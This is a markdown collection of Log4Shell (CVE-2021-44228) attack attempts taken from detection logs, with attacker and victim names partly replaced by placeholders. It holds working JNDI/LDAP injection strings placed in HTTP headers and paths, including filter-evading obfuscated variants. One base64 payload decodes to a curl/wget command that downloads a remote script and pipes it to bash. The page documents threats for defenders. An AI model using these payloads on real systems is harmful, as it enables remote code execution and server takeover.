# CVE-2021-44228 (Log4Shell) examples detected in the wild

Notes: 

- Replace potentially logged attacked domain with 'victim.example.com'
- Replace potentially logged remote client/IP with 'attacker'
- Replace potentially logged bad server (containing the RCE) with 'target.example.com'

## Using payload in request


## Using payload in headers
```
Found potential log4j attack in header user-agent:${jndi:ldap://target.example.com:1389/Basic/Command/Base64/KGN1cmwgLVMgaHR0cHM6Ly93d3cuZWNvbi1qb2JzLmNvbS9TY3JpcHRzL29wLnBocHx8d2dldCBodHRwczovL3d3dy5lY29uLWpvYnMuY29tL1NjcmlwdHMvb3AucGhwKXxiYXNo}, client: attacker, server: victim.example.com, request: "GET /shop/admin/ppcorg HTTP/2.0", host: "victim.example.com", referrer: "https://victim.example.com/shop/admin/ppcorg"
Found potential log4j attack in header user-agent:${jndi:ldap://target.example.com:1389/ee2d66f1-a7e7-4425-8662-35319a82a98b}, client: attacker, server: victim.example.com, request: "GET / HTTP/2.0", host: "victim.example.com"
Found potential log4j attack in header user-agent:${jndi:ldap://x${hostName}.target.example.com/a}, client: attacker, server: victim.example.com, request: "GET /blog/ HTTP/2.0", host: "victim.example.com", referrer: "https://www.google.com/"
Found potential log4j attack in header user-agent:/${jndi:ldap://target.example.com:1389/Exploit}, client: attacker, server: victim.example.com, request: "GET / HTTP/1.1", host: "victim.example.com"
Found potential log4j attack in header user-agent:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}${upper:d}${lower:a}${upper:p}://target.example.com:1389/t}, client: attacker, server: victim.example.com, request: "GET / HTTP/1.1", host: "victim.example.com:443"
Found potential log4j attack in header x-api-version:${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://target.example.com:1389/t}, client: attacker, server: victim.example.com, request: "GET / HTTP/1.1", host: "victim.example.com:443"
```

## Using payload in request and headers

```
Found potential log4j attack in header x-forwarded-for:${${::-j}nd${::-i}:ldap://target.example.com:1389/or2q2y}, client: attacker, server: victim.example.com, request: "GET /x=$%7B$%7B::-j%7Dnd$%7B::-i%7D:ldap:/target.example.com:1389/or2q2y%7D?id=%24%7B%24%7B%3A%3A-j%7Dnd%24%7B%3A%3A-i%7D%3Aldap%3A%2F%2Ftarget.example.com%3A1389%2For2q2y%7D HTTP/1.1", host: "victim.example.com", referrer: "${${::-j}nd${::-i}:ldap://target.example.com:1389/or2q2y}"
Found potential log4j attack in header true-client-ip:${jndi:ldap://target.example.com:62582/a13923}, client: attacker, server: victim.example.com, request: "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Ftarget.example.com%3A62582%2Fa13923%7D HTTP/1.1", host: "victim.example.com", referrer: "${jndi:ldap://target.example.com:62582/a13923}"
Found potential log4j attack in header cookie:${jndi:ldap://target.example.com:2222/lx-ffffd46747ddbb0103daf4b761000000008e974c}=${jndi:ldap://target.example.com:2222/lx-ffffd46747ddbb0104daf4b7610000000020ca85}, client: attacker, server: victim.example.com, request: "GET /$%7Bjndi:ldap://target.example.com:2222/lx-ffffd46747ddbb0100daf4b761000000000dfd35%7D?${jndi:ldap://target.example.com:2222/lx-ffffd46747ddbb0101daf4b76100000000a4adee}=${jndi:ldap://target.example.com:2222/lx-ffffd46747ddbb0102daf4b76100000000a05b12} HTTP/1.1", host: "${jndi:ldap:"
```
